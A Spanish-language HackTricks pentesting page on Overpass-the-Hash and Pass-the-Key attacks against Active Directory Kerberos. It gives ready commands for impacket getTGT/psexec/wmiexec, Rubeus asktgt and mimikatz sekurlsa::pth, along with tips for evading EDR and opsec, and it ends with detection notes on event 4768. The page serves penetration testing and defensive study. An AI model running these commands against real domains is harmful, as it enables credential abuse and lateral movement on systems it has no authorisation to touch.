# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

El ataque **Overpass The Hash/Pass The Key (PTK)** está diseñado para entornos donde el protocolo NTLM tradicional está restringido y la autenticación Kerberos tiene prioridad. Este ataque aprovecha el hash NTLM o las claves AES de un usuario para solicitar tickets Kerberos, permitiendo acceso no autorizado a recursos dentro de una red.

En sentido estricto:

- **Over-Pass-the-Hash** normalmente significa convertir el **NT hash** en un TGT de Kerberos mediante la clave Kerberos **RC4-HMAC**.
- **Pass-the-Key** es la versión más genérica, donde ya tienes una clave Kerberos como **AES128/AES256** y solicitas un TGT directamente con ella.

Esta diferencia importa en entornos endurecidos: si **RC4 está deshabilitado** o el KDC ya no lo asume, el **NT hash por sí solo no es suficiente** y necesitas una **clave AES** (o la contraseña en claro para derivarla).

Para ejecutar este ataque, el paso inicial consiste en obtener el hash NTLM o la contraseña de la cuenta del usuario objetivo. Una vez obtenida esta información, se puede conseguir un Ticket Granting Ticket (TGT) para la cuenta, lo que permite al atacante acceder a servicios o máquinas para los que el usuario tiene permisos.

El proceso puede iniciarse con los siguientes comandos:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Para escenarios que requieran AES256, se puede utilizar la opción `-aesKey [AES key]`:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` también admite solicitar un **service ticket directamente mediante un AS-REQ** con `-service <SPN>`, lo cual puede ser útil cuando quieres un ticket para un SPN específico sin un TGS-REQ adicional:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Además, el ticket adquirido podría emplearse con varias herramientas, incluyendo `smbexec.py` o `wmiexec.py`, ampliando el alcance del ataque.

Los problemas encontrados, como _PyAsn1Error_ o _KDC cannot find the name_, suelen resolverse actualizando la biblioteca Impacket o usando el hostname en lugar de la dirección IP, asegurando compatibilidad con el Kerberos KDC.

Una secuencia de comandos alternativa usando Rubeus.exe demuestra otra faceta de esta técnica:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Este método refleja el enfoque **Pass the Key**, con un enfoque en tomar el control y utilizar el ticket directamente para fines de autenticación. En la práctica:

- `Rubeus asktgt` envía por sí mismo el **raw Kerberos AS-REQ/AS-REP** y **no** necesita privilegios de admin a menos que quieras apuntar a otra sesión de inicio de sesión con `/luid` o crear una separada con `/createnetonly`.
- `mimikatz sekurlsa::pth` parchea material de credenciales en una sesión de inicio de sesión y, por tanto, **toca LSASS**, lo que normalmente requiere local admin o `SYSTEM` y es más ruidoso desde la perspectiva de un EDR.

Ejemplos con Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Para ajustarse a la seguridad operacional y usar AES256, se puede aplicar el siguiente comando:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` es relevante porque el tráfico generado por Rubeus difiere ligeramente del Kerberos nativo de Windows. También ten en cuenta que `/opsec` está pensado para tráfico **AES256**; usarlo con RC4 normalmente requiere `/force`, lo que arruina gran parte del punto porque **RC4 en dominios modernos es en sí misma una señal fuerte**.

## Detection notes

Cada solicitud de TGT genera **event `4768`** en el DC. En las builds actuales de Windows este evento contiene campos más útiles de lo que mencionan los writeups antiguos:

- `TicketEncryptionType` te indica qué enctype se usó para el TGT emitido. Los valores típicos son `0x17` para **RC4-HMAC**, `0x11` para **AES128**, y `0x12` para **AES256**.
- Los eventos actualizados también exponen `SessionKeyEncryptionType`, `PreAuthEncryptionType`, y los enctypes anunciados por el cliente, lo que ayuda a distinguir la **dependencia real de RC4** de los confusos valores predeterminados heredados.
- Ver `0x17` en un entorno moderno es una buena pista de que la cuenta, el host, o la ruta de fallback del KDC todavía permite RC4 y, por tanto, es más amigable para Over-Pass-the-Hash basado en NT-hash.

Microsoft ha ido reduciendo progresivamente el comportamiento de RC4-por-defecto desde las actualizaciones de endurecimiento de Kerberos de noviembre de 2022, y la guía publicada actual es **eliminar RC4 como enctype asumido por defecto para AD DCs antes de finales del Q2 2026**. Desde una perspectiva ofensiva, eso significa que **Pass-the-Key con AES** es cada vez más la ruta fiable, mientras que el clásico **NT-hash-only OpTH** seguirá fallando con más frecuencia en entornos endurecidos.

Para más detalles sobre los tipos de encriptación de Kerberos y el comportamiento relacionado con los tickets, revisa:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Cada logon session solo puede tener un TGT activo a la vez, así que ten cuidado.

1. Crea una nueva logon session con **`make_token`** desde Cobalt Strike.
2. Luego, usa Rubeus para generar un TGT para la nueva logon session sin afectar la existente.

Puedes lograr una aislamiento similar desde el propio Rubeus con una sesión sacrificial de **logon type 9**:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Esto evita sobrescribir el TGT de la sesión actual y suele ser más seguro que importar el ticket en tu sesión de inicio de sesión existente.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
